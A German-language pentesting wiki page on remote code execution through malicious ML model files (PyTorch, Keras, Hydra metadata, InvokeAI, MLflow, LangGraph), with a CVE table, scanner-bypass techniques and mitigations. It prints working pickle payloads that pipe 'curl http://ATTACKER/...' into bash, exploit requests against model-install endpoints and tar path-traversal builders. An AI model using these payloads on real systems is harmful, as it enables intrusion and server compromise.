# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Modelle laden, um RCE zu erreichen

Machine-Learning-Modelle werden üblicherweise in verschiedenen Formaten wie ONNX, TensorFlow, PyTorch usw. geteilt. Entwickler können diese Modelle auf ihren Rechnern oder in Produktionssystemen laden und verwenden. Normalerweise sollten die Modelle keinen schädlichen Code enthalten. In manchen Fällen kann ein Modell jedoch dazu verwendet werden, wie vorgesehen beliebigen Code auf dem System auszuführen oder dies aufgrund einer Schwachstelle in der Bibliothek zum Laden des Modells zu ermöglichen.

Die folgende Tabelle enthält repräsentative Schwachstellen dieser Kategorie:

| **Framework / Tool**        | **Schwachstelle (falls verfügbar mit CVE)**                                                    | **RCE-Vektor**                                                                                                                           | **Referenzen**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Unsichere Deserialisierung in* `torch.load` **(CVE-2025-32434)**                                                              | Schädliches Pickle im Modell-Checkpoint führt zur Codeausführung (umgeht die Schutzmaßnahme `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + schädlicher Modelldownload führt zur Codeausführung; RCE durch Java-Deserialisierung in der Management-API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsichere Deserialisierung von Checkpoints über `torch.load` **(CVE-2025-23298)**                                           | Ein nicht vertrauenswürdiger Checkpoint löst während `load_model_trainer_states_from_checkpoint` einen Pickle-Reducer aus → Codeausführung im ML-Worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis-Checkpointer) | SQLi + unsicherer MessagePack-Erweiterungshook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Ein vom Benutzer kontrollierter `filter`-Schlüssel fügt SQL-/JSON-Pfad-Syntax ein, `UNION SELECT` erzeugt eine gefälschte Checkpoint-Zeile, anschließend importiert und ruft die `msgpack`-Deserialisierung vom Angreifer ausgewählten Python-Code auf | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsicheres YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Das Laden eines Modells aus YAML verwendet `yaml.unsafe_load` (Codeausführung) <br> Das Laden eines Modells mit einer **Lambda**-Schicht führt beliebigen Python-Code aus          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite-Parsing)                                                                                          | Ein präpariertes `.tflite`-Modell löst einen Integer-Overflow → Heap-Korruption aus (potenzielle RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Beim Laden eines Modells mit `joblib.load` wird Pickle mit der `__reduce__`-Payload des Angreifers ausgeführt                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsicheres `np.load`) *umstritten*                                                                              | `numpy.load` erlaubte standardmäßig gepickelte Objekt-Arrays – eine schädliche `.npy/.npz`-Datei löst Codeausführung aus                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (Verzeichnis-Traversal) <br> **CVE-2024-5187** (Tar-Traversal)                                                    | Der Pfad zu den externen Gewichten eines ONNX-Modells kann aus dem Verzeichnis herausführen (beliebige Dateien lesen) <br> Ein schädliches ONNX-Modell-Tar-Archiv kann beliebige Dateien überschreiben (und so zu RCE führen) | |
| ONNX Runtime (Designrisiko)  | *(Keine CVE)* Benutzerdefinierte ONNX-Operatoren / Kontrollfluss                                                                                    | Ein Modell mit einem benutzerdefinierten Operator erfordert das Laden nativen Codes des Angreifers; komplexe Modellgraphen missbrauchen die Logik, um unbeabsichtigte Berechnungen auszuführen   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (Pfad-Traversal)                                                                                          | Wenn die Model-Load-API mit aktiviertem `--model-control` verwendet wird, ermöglicht relative Pfad-Traversal das Schreiben von Dateien (z. B. das Überschreiben von `.bashrc` für RCE)    | |
| **GGML (GGUF-Format)**      | **CVE-2024-25664 … 25668** (mehrere Heap-Overflows)                                                                         | Eine fehlerhafte GGUF-Modelldatei verursacht Heap-Pufferüberläufe im Parser und ermöglicht so die Ausführung beliebigen Codes auf dem System des Opfers                     | |
| **Keras (ältere Formate)**   | *(Keine neue CVE)* Älteres Keras-H5-Modell                                                                                         | Code in einer schädlichen HDF5-Modell-Datei (`.h5`) mit einer Lambda-Schicht wird beim Laden weiterhin ausgeführt (Keras `safe_mode` deckt das alte Format nicht ab – „Downgrade-Angriff“) | |
| **Andere** (allgemein)        | *Designfehler* – Pickle-Serialisierung                                                                                         | Viele ML-Tools (z. B. Pickle-basierte Modellformate und Python `pickle.load`) führen beliebigen Code aus, der in Modelldateien eingebettet ist, sofern dies nicht verhindert wird | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Nicht vertrauenswürdige Metadaten werden an `hydra.utils.instantiate()` übergeben **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Vom Angreifer kontrollierte Modellmetadaten bzw. -konfiguration setzen `_target_` auf einen beliebigen Callable (z. B. `builtins.exec`) → wird beim Laden ausgeführt, selbst bei „sicheren“ Formaten (`.safetensors`, `.nemo`, `config.json` des Repositorys) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Außerdem gibt es einige Python-Pickle-basierte Modelle, etwa die von [PyTorch](https://github.com/pytorch/pytorch/security) verwendeten, mit denen beliebiger Code auf dem System ausgeführt werden kann, wenn sie nicht mit `weights_only=True` geladen werden. Daher könnte jedes Pickle-basierte Modell besonders anfällig für diese Art von Angriffen sein, selbst wenn es nicht in der obigen Tabelle aufgeführt ist.

### Statische Prüfungen bei Pickle-basierten Checkpoints umgehen

Ein Pfad zum Laden von Modellen, der uneingeschränktes `pickle.load()`, `joblib.load()` oder `torch.load(..., weights_only=False)` aufruft, ist ein Ausführungssink und nicht bloß ein Parser.<sup>[[22]](#references)</sup> In PyTorch 2.6 ist `weights_only=True` der Standardwert für `torch.load()`, wenn kein benutzerdefiniertes Pickle-Modul angegeben ist; die folgenden Beispiele erfordern einen uneingeschränkten Loader oder eine Anwendung, die diesen Schutz deaktiviert, um ein nicht unterstütztes Objekt zu laden.<sup>[[4]](#references)</sup> Ein unauffälliges Ergebnis eines statischen Scans ändert an dieser Grenze nichts.<sup>[[21]](#references)</sup>

Siehe [Python-Pickle-Deserialisierung](../pentesting-web/deserialization/#pickle) für das grundlegende `__reduce__`-Primitiv und [Ficklings ML-Import-Allowlist](../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md#ml-pickle-import-allowlisting-for-aiml-models-fickling) für Laufzeitprüfungen von Imports.

#### Einen Callable registrieren und dann mit `EXT2` auflösen

Ein Pickle kann über `REDUCE` `copyreg.add_extension` aufrufen und ein Modul-/Namenspaar unter einem vom Angreifer gewählten numerischen Erweiterungscode registrieren. Ein späteres `EXT2` löst diesen Code zum Callable auf, den ein weiteres `REDUCE` aufrufen kann. Der kritische Callable ist daher nicht das Argument eines `GLOBAL`- oder `STACK_GLOBAL`-Opcodes. Binarly demonstrierte dies mit `multiprocessing.util.spawnv_passfds`; vier von fünf untersuchten Scannern erkannten es nicht, während SaferPickle es erkannte. Die Änderung der Registry und die Auflösung durch `EXT2` finden während desselben Unpickling-Vorgangs statt.<sup>[[21]](#references)[[22]](#references)</sup>

```text
GLOBAL       'copyreg add_extension'
BINUNICODE   'multiprocessing.util'
BINUNICODE   'spawnv_passfds'
BININT2      31337
TUPLE3
REDUCE       # register the extension
POP
EXT2         31337  # resolve the callable
# Push its arguments, then REDUCE to call it
```

Dies ist eine Opcode-Skizze, kein vollständiger Checkpoint: Der äußere Loader muss den umgebenden pickle-Stream akzeptieren. Ein Scanner, der nur `GLOBAL`-Operanden nach gefährlichen Callables durchsucht, übersieht den späteren Lookup; ein Scanner ohne `EXT2`-Unterstützung kann abbrechen, bevor er ein Urteil abgibt. Eine strenge Allowlist könnte sogar `copyreg.add_extension` selbst ablehnen.<sup>[[21]](#references)</sup>

#### Konstruierte Code-Objekt-Typen hinter gewöhnlichen Funktionen verbergen

Eine weitere pickle-Kette kann `FunctionType` über `type(copy.copy)` und `CodeType` über `type(copy.copy.__code__)` abrufen, dann aus bereitgestelltem Bytecode ein Code-Objekt erstellen, es als Funktion verpacken und aufrufen. Die veröffentlichte Variante ruft `__code__` über `operator.methodcaller('__getattribute__', '__code__')` ab, sodass das pickle keinen der beiden Konstruktoren namentlich importieren muss. Das Feldlayout und der Bytecode von `CodeType(...)` sind CPython-versionsspezifisch; eine für einen anderen Interpreter erstellte Payload kann vor der Ausführung fehlschlagen. SaferPickle markierte das gezeigte Beispiel weiterhin, stufte es aber als `suspicious` ein; die anderen vier getesteten Scanner übersahen es.<sup>[[21]](#references)[[22]](#references)</sup>

```python
from copy import copy
from operator import methodcaller
function_type = type(copy)
code_type = type(methodcaller('__getattribute__', '__code__')(copy))
# REDUCE can construct code_type(...) and function_type(code, {})
```

#### Einen zweiten Modell-Ladevorgang über ein Pickle-Argument auslösen

Ein äußeres Pickle kann `torch.storage._load_from_bytes` mit einem vom Angreifer bereitgestellten serialisierten Modell als Argument aufrufen. Diese Funktion ruft `torch.load(io.BytesIO(b), weights_only=False)` auf, sodass das verschachtelte Modell ohne die Einschränkung `weights_only` deserialisiert wird, obwohl es für einen Opcode-Scanner auf oberster Ebene wie Bytes aussieht, die an einen Callable übergeben werden. Der äußere Ladevorgang muss diesen Callable weiterhin zulassen; `weights_only=True` führt nicht automatisch dazu, dass das äußere Pickle ihn akzeptiert. Scanner, die die verschachtelten Bytes nicht rekursiv untersuchen, können die innere `GLOBAL`/`REDUCE`-Kette übersehen.<sup>[[21]](#references)[[23]](#references)</sup>

#### Einen veralteten Pickle-Modulnamen beim Laden auflösen

Bei Pickle-Protokollen unter 3 ordnet Pythons Standardeinstellung `fix_imports=True` eine `GLOBAL`-Referenz auf `commands.run` über `_compat_pickle.IMPORT_MAPPING` `subprocess.run` zu. Ein Scanner, der die wörtliche Modulzeichenfolge mit einer `subprocess`-Denylist vergleicht, kann daher den Callable übersehen, der zur Laufzeit aufgerufen wird. Dafür ist ein Loader erforderlich, der das Kompatibilitäts-Mapping beibehält und die resultierenden Aufrufargumente akzeptiert.<sup>[[21]](#references)[[24]](#references)[[25]](#references)</sup>

#### Einen Nicht-ZIP-Checkpoint an einem ZIP-exklusiven Scanner vorbeileiten

Die Formatauswahl kann unabhängig von der Opcode-Inspektion fehlschlagen: Binarly stellte fest, dass ModelScan 0.8.8 Dateien mit den Endungen `.bin`, `.pt`, `.pth` und `.ckpt` an einen PyTorch-Scanner weiterleitete, der ausschließlich ZIP-Dateien prüft, und einen Nicht-ZIP-Pickle-Stream übersprang, statt auf seinen Plain-Pickle-Scanner zurückzugreifen. Außerdem dokumentierte das Unternehmen ein veraltetes TAR-Modell-Layout, das `torch.load()` akzeptiert, ModelScan und JFrog jedoch nicht untersuchten. Dabei handelt es sich um versionsspezifische Lücken von Scannern, nicht um Eigenschaften jedes Modell-Scanners.<sup>[[21]](#references)</sup>

#### Vor der Verarbeitung eines fehlerhaften Endes durch einen statischen Parser ausführen

Ein Scanner, der ein Pickle vollständig mit `pickletools.genops()` durchläuft, kann bei einem abgeschnittenen Opcode nach einem gültigen `REDUCE` einen Fehler auslösen. Der uneingeschränkte Unpickler hat den Callable bereits aufgerufen, bevor er auf dieses Ende stößt, selbst wenn der gesamte Ladevorgang später einen Fehler auslöst. Das gemeldete Beispiel platzierte unmittelbar nach dem ausführenden `REDUCE` ein abgeschnittenes `BINUNICODE`, wodurch `pickletools.genops()` fehlschlug, obwohl die Datei zuvor bereits einen Schreib-Seiteneffekt ausgelöst hatte. Dieser Bypass funktioniert nur, wenn ein Scanner den Parse-Fehler als unbedenklich behandelt oder die Datei überspringt. Er ist nur dann nützlich, wenn der Seiteneffekt auch ohne erfolgreich zurückgegebenes Modell relevant ist; ein Ziel, das einen abgeschlossenen Ladevorgang voraussetzt, kann das Artefakt ablehnen.<sup>[[21]](#references)</sup>

### Hydra-Metadaten → RCE (funktioniert auch mit safetensors)

`hydra.utils.instantiate()` importiert und ruft jeden gepunkteten `_target_` in einem Konfigurations-/Metadatenobjekt auf. Wenn Bibliotheken wie Hugging Face Transformers **nicht vertrauenswürdige Modellmetadaten** an `instantiate()` übergeben, kann ein Angreifer einen Callable und Argumente bereitstellen, die sofort beim Laden des Modells ausgeführt werden (kein Pickle erforderlich).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Payload-Beispiel (funktioniert in `.nemo` `model_config.yaml`, im Repo-`config.json` oder in `__metadata__` innerhalb von `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Wichtige Punkte:
- Wird vor der Modellinitialisierung in NeMo `restore_from/from_pretrained`, den HuggingFace-Codern von uni2TS und den FlexTok-Loadern ausgelöst.
- Hydras String-Blockliste lässt sich über alternative Importpfade (z. B. `enum.bltns.eval`) oder von der Anwendung aufgelöste Namen (z. B. `nemo.core.classes.common.os.system` → `posix`) umgehen.<sup>[[14]](#references)</sup>
- FlexTok parst außerdem String-Metadaten mit `ast.literal_eval`, wodurch vor dem Hydra-Aufruf ein DoS (CPU-/Speicherüberlastung) möglich ist.

### 🆕  InvokeAI-RCE über `torch.load` (CVE-2024-12029)

`InvokeAI` ist eine beliebte Open-Source-Weboberfläche für Stable-Diffusion. Die Versionen **5.3.1 – 5.4.2** stellen den REST-Endpunkt `/api/v2/models/install` bereit, über den Nutzer Modelle von beliebigen URLs herunterladen und laden können.<sup>[[1]](#references)</sup>

Intern ruft der Endpunkt schließlich Folgendes auf:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Wenn es sich bei der bereitgestellten Datei um einen **PyTorch-Checkpoint (`*.ckpt`)** handelt, führt `torch.load` eine **pickle-Deserialisierung** durch. Da der Inhalt direkt von der vom Benutzer kontrollierten URL stammt, kann ein Angreifer ein bösartiges Objekt mit einer benutzerdefinierten `__reduce__`-Methode in den Checkpoint einbetten. Diese Methode wird **während der Deserialisierung** ausgeführt, was zu **Remote Code Execution (RCE)** auf dem InvokeAI-Server führt.

Die Sicherheitslücke erhielt die Kennung **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploitation-Walkthrough

1. Einen bösartigen Checkpoint erstellen:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Hosten Sie `payload.ckpt` auf einem HTTP-Server, den Sie kontrollieren (z. B. `http://ATTACKER/payload.ckpt`).
3. Lösen Sie den verwundbaren Endpoint aus (keine Authentifizierung erforderlich):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Wenn InvokeAI die Datei herunterlädt, ruft es `torch.load()` auf → das `os.system`-Gadget wird ausgeführt und der Angreifer erhält Codeausführung im Kontext des InvokeAI-Prozesses.

Fertiges Exploit: Das **Metasploit**-Modul `exploit/linux/http/invokeai_rce_cve_2024_12029` automatisiert den gesamten Ablauf.<sup>[[3]](#references)</sup>

#### Voraussetzungen

•  InvokeAI 5.3.1-5.4.2 (Scan-Flag standardmäßig **false**)
•  `/api/v2/models/install` ist für den Angreifer erreichbar
•  Der Prozess verfügt über Berechtigungen zum Ausführen von Shell-Befehlen

#### Gegenmaßnahmen

* Upgrade auf **InvokeAI ≥ 5.4.3** – der Patch setzt `scan=True` als Standard und führt vor der Deserialisierung einen Malware-Scan durch.<sup>[[2]](#references)</sup>
* Verwende beim programmgesteuerten Laden von Checkpoints `torch.load(file, weights_only=True)` oder den neuen [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security)-Helper.
* Setze Allow-Lists / Signaturen für Modellquellen durch und betreibe den Dienst mit den geringsten erforderlichen Berechtigungen.

> ⚠️ Denke daran, dass **jedes** Python-Pickle-basierte Format (einschließlich vieler `.pt`-, `.pkl`-, `.ckpt`- und `.pth`-Dateien) grundsätzlich unsicher ist, wenn es aus nicht vertrauenswürdigen Quellen deserialisiert wird.

---

Beispiel für eine Ad-hoc-Gegenmaßnahme, falls du ältere InvokeAI-Versionen hinter einem Reverse Proxy weiterbetreiben musst:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec RCE via unsicherem `torch.load` (CVE-2025-23298)

NVIDIA’s Transformers4Rec (Teil von Merlin) legte einen unsicheren Checkpoint-Loader offen, der `torch.load()` direkt mit vom Benutzer angegebenen Pfaden aufrief. Da `torch.load` auf Python `pickle` basiert, kann ein vom Angreifer kontrollierter Checkpoint während der Deserialisierung über einen Reducer beliebigen Code ausführen.<sup>[[5]](#references)</sup>

Verwundbarer Pfad (vor dem Fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Warum dies zu RCE führt: In Python `pickle` kann ein Objekt einen Reducer (`__reduce__`/`__setstate__`) definieren, der eine aufrufbare Funktion und Argumente zurückgibt. Die Funktion wird während des Unpickling ausgeführt. Ist ein solches Objekt in einem Checkpoint enthalten, wird es ausgeführt, bevor irgendwelche Gewichte verwendet werden.

Minimales Beispiel für einen bösartigen Checkpoint:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Auslieferungsvektoren und Auswirkungsbereich:
- Trojanisierte Checkpoints/Modelle, die über Repos, Buckets oder Artifact Registries geteilt werden
- Automatisierte Resume-/Deploy-Pipelines, die Checkpoints automatisch laden
- Die Ausführung findet innerhalb von Training-/Inference-Workern statt, oft mit erhöhten Berechtigungen (z. B. root in Containern)

Behebung: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ersetzte den direkten Aufruf von `torch.load()` durch einen eingeschränkten Deserializer mit Allowlist, implementiert in `transformers4rec/utils/serialization.py`. Der neue Loader validiert Typen/Felder und verhindert, dass während des Ladens beliebige Callables aufgerufen werden.<sup>[[7]](#references)</sup>

Spezielle Sicherheitsmaßnahmen für PyTorch-Checkpoints:
- Unpickle keine nicht vertrauenswürdigen Daten. Bevorzuge nach Möglichkeit nicht ausführbare Formate wie [Safetensors](https://huggingface.co/docs/safetensors/index) oder ONNX.
- Wenn du die PyTorch-Serialisierung verwenden musst, stelle sicher, dass `weights_only=True` gesetzt ist (wird von neueren PyTorch-Versionen unterstützt), oder verwende einen benutzerdefinierten Unpickler mit Allowlist, ähnlich dem Transformers4Rec-Patch.<sup>[[4]](#references)</sup>
- Erzwinge die Herkunftsprüfung/Signaturen von Modellen und führe die Deserialisierung in einer Sandbox aus (seccomp/AppArmor; Nicht-root-Benutzer; eingeschränktes Dateisystem und kein ausgehender Netzwerkverkehr).
- Überwache ML-Dienste beim Laden von Checkpoints auf unerwartete Child-Prozesse; verfolge die Verwendung von `torch.load()`/`pickle`.

POC- und Referenzen zu verwundbaren Versionen/Patches:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Verwundbarer Loader vor dem Patch: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC für einen bösartigen Checkpoint: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader nach dem Patch: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Beispiel – Erstellen eines bösartigen PyTorch-Modells

- Modell erstellen:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Modell laden:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserialisierung Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’s FaceDetection-DSFD stellt einen `resnet`-Endpunkt bereit, der benutzergesteuerte Daten deserialisiert. ZDI bestätigte, dass ein Remote-Angreifer ein Opfer dazu bringen kann, eine bösartige Seite/Datei zu laden, sie einen präparierten serialisierten Blob an diesen Endpunkt senden zu lassen und so die Deserialisierung als `root` auszulösen, was zur vollständigen Kompromittierung führt.

Der Exploit-Ablauf entspricht dem typischen pickle-Missbrauch:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Jedes Gadget, das während der Deserialisierung erreichbar ist (Konstruktoren, `__setstate__`, Framework-Callbacks usw.), kann auf dieselbe Weise als Waffe eingesetzt werden – unabhängig davon, ob die Übertragung über HTTP, WebSocket oder eine Datei erfolgt, die in einem überwachten Verzeichnis abgelegt wird.



### LangGraph checkpointer SQLi → MessagePack RCE

Diese Angriffskette ist interessant, weil der Angreifer **keine schädliche Modelldatei hochladen muss**. Stattdessen stellt die Anwendung eine **Persistenz-API für AI-Agenten** (`get_state_history(..., filter=...)`) bereit, und Benutzereingaben erreichen den Abfrage-Builder des Checkpointers.

#### 1. Strukturelle SQLi in Metadatenfiltern

Ein anfälliges SQLite-Muster sah so aus:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Der Wert wird später gebunden, aber `query_key` wird in den **JSON path-String** verkettet. Daher bricht ein `'` innerhalb des Dictionary-Schlüssels aus `'$.{query_key}'` aus und injiziert SQL. Dieselbe Lehre gilt für **JSON paths, identifiers, operators, `LIMIT`- und TTL-Felder**: Platzhalter schützen nur Werte, nicht die strukturelle Query-Syntax.

#### 2. `UNION SELECT` kann nachgelagerte Senken ansprechen, nicht nur Daten stehlen

Die Query gibt `type` und serialisierte `checkpoint`-Bytes zurück, die später wie folgt verarbeitet werden:

```python
self.serde.loads_typed((type, checkpoint))
```

Das bedeutet, dass eine SQLi in der `WHERE`-Klausel eine **gefälschte Ergebniszeile** einschleusen kann:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Wenn späterer Code eine ausgewählte Spalte parst, deserialisiert, schreibt oder ausführt, ordne diese Spalten ihren Sinks zu. In diesem Fall macht die gefälschte Zeile aus SQLi eine **vom Angreifer kontrollierte Deserialisierung**.

#### 3. Unsichere MessagePack-Erweiterungshooks sind Code-Gadgets gleichzusetzen

Der `msgpack`-Pfad von LangGraph verwendete einen benutzerdefinierten Erweiterungshook, der ein verschachteltes Tupel entpackte und Folgendes ausführte:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Ein MessagePack-Erweiterungsobjekt, das etwas Entsprechendem wie `("os", "system", "id > /tmp/pwned")` kodiert, importiert also `os`, löst `system` auf und führt den Befehl aus. Untersuche bei AI-Frameworks **benutzerdefinierte MessagePack/JSON/pickle-Reviver** auf dynamische Imports, Reflection oder beliebiges Callable-Dispatching.

#### 4. Praktisches Audit-Muster für Agent-Frameworks

Untersuche alle benutzergesteuerten Eingaben, die Folgendes erreichen:
- State-History-/Memory-/Replay-/Checkpoint-Listing-APIs
- strukturierte Filter-Builder, die SQL- oder Redis-Abfragefragmente erzeugen
- benutzerdefinierte Deserialisierer (`pickle`, `msgpack`, `json`-Object-Hooks, YAML-Konstruktoren)
- Recovery-Pfade, die den von der Persistence-Layer zurückgegebenen Zeilen vertrauen

Diese konkrete Angriffskette betraf selbst gehostete LangGraph-Deployments mit **SQLite**- oder **Redis**-Checkpointern, wenn nicht vertrauenswürdige Benutzer `filter` kontrollieren konnten. Die in der Offenlegung genannten gepatchten Versionen waren `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` und `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

### MLflow-PyFunc-Artefaktüberschreibung zu pickle-RCE

Ein aus einem `PythonModel` erstelltes MLflow-PyFunc-Modell kann das serialisierte Objekt als `python_model.pkl` speichern. Die Modellmetadaten nennen `mlflow.pyfunc.model` als Loader, und die MLflow-Implementierung verwendet diesen Dateinamen für das gespeicherte Python-Modell. Daher kann Schreibzugriff auf den Artefaktspeicher zu Codeausführung in einer anderen Anwendung führen, die das Modell später lädt.<sup>[[17]](#references)[[18]](#references)</sup>

Die nützliche Angriffskette lautet **Schreibberechtigung für Artefakte → pickle ersetzen → einen Inferenz-Consumer dazu bringen, es erneut zu laden**. Zähle bei einem Experiment mit einer `mlflow-artifacts:/...`-Root über einen Proxy die Artefaktpfade für Experiment, Run und Modell auf. Der Tracking-Server stellt `GET` und `PUT` unter `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>` bereit.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

Ein minimaler Reducer kann einen Befehl ausführen, sobald der Consumer das Artefakt unpickelt. Wird das Payload mit der in `MLmodel` angegebenen Python-Version erstellt, lassen sich Kompatibilitätsprobleme vermeiden.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Lösen Sie den Vorgang aus, der **das vorhandene Modell lädt**, z. B. Vorhersage, Scoring oder Deployment. Trainieren Sie nicht zuerst erneut, da das Training das bösartige Artefakt durch ein neues Modell ersetzen könnte. Ein Anwendungsfehler schließt eine erfolgreiche Ausnutzung nicht aus: Der Reducer gibt den ganzzahligen Exit-Status des Befehls statt eines verwendbaren Modells zurück. Beginnen Sie mit einem beobachtbaren Nebeneffekt wie einem ICMP- oder HTTP-Callback und ersetzen Sie diesen anschließend durch die endgültige Payload.<sup>[[20]](#references)</sup>

Unterscheiden Sie bei der Untersuchung zwischen der Berechtigung, einen Run zu erstellen, und der Berechtigung, Artefakte eines anderen Runs zu überschreiben. Überprüfen Sie die Authentifizierung und die Update-Berechtigungen pro Run, untersuchen Sie unerwartete Änderungen an `python_model.pkl` und betrachten Sie die Herkunft und Integrität des Modells als Teil der Ausführungsgrenze. Der aktuelle MLflow-Code unterstützt außerdem die Einstellung `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` und empfiehlt Modelle-from-Code-Artefakte anstelle des Ladens von cloudpickle-Daten.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

### Offen zugängliche Model-Server und ML-Infrastruktur

Das Laden eines bösartigen Modells ist nicht die einzige Möglichkeit, Code auf ML-Infrastruktur auszuführen. APIs zur Jobübermittlung, Codevalidierungs-Endpunkte und Model-Registry-Abrufe bei selbst gehosteten AI-Diensten können auch ohne Modelldatei zur Codeausführung führen. Siehe [Exposed Self-Hosted AI Services](AI-Exposed-Self-Hosted-AI-Services.md).

## Modelle zu Path Traversal

Wie in [**diesem Blogbeitrag**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) erläutert, basieren die meisten von verschiedenen AI-Frameworks verwendeten Modellformate auf Archiven, meist `.zip`. Daher lassen sich diese Formate möglicherweise für Path-Traversal-Angriffe missbrauchen, um beliebige Dateien auf dem System auszulesen, auf dem das Modell geladen wird.<sup>[[16]](#references)</sup>

Mit dem folgenden Code können Sie beispielsweise ein Modell erstellen, das beim Laden eine Datei im Verzeichnis `/tmp` erstellt:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Oder mit dem folgenden Code können Sie ein Modell erstellen, das beim Laden einen symlink zum Verzeichnis `/tmp` erstellt:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
